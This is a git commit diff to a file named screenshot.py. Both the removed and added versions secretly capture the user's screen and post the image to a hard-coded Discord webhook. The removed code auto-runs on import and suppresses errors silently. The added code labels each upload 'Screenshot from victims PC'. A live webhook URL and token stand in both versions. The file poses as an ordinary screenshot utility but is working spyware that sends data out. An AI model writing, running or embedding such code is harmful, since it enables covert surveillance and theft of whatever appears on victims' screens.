277b29015cac86dadb04104004e874ad036bfa40
kaki869 <thexor7@gmail.com>
2025-11-02 19:17:43 +0000

    Update screenshot.py

--- screenshot.py
+++ screenshot.py
@@ -1,31 +1,19 @@
 import pyautogui
+import time
 import requests
-import os
 
-def windows_screenshot_github():
-    """Use this in your GitHub screenshot.py file"""
-    try:
-        # Take screenshot
-        screenshot = pyautogui.screenshot()
-        
-        # Save to desktop
-        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
-        temp_file = os.path.join(desktop, "temp_screen.png")
-        screenshot.save(temp_file)
-        
-        # Send to Discord
-        WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
-        
-        with open(temp_file, 'rb') as f:
-            response = requests.post(WEBHOOK_URL, files={'file': f})
-        
-        # Clean up
-        if os.path.exists(temp_file):
-            os.remove(temp_file)
-            
-    except Exception as e:
-        # Silent fail for GitHub execution
-        pass
+def take_screenshot(filename='screenshot.png'):
+    screenshot = pyautogui.screenshot()
+    screenshot.save(filename)
+    return filename
 
-# Auto-execute when loaded
-windows_screenshot_github()
+def send_to_discord_webhook(webhook_url, file_path):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        data = {'content': 'Screenshot from victims PC'}
+        response = requests.post(webhook_url, files=files, data=data)
+
+if __name__ == "__main__":
+    screenshot_path = take_screenshot()
+    webhook_url = 'https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8'
+    send_to_discord_webhook(webhook_url, screenshot_path)
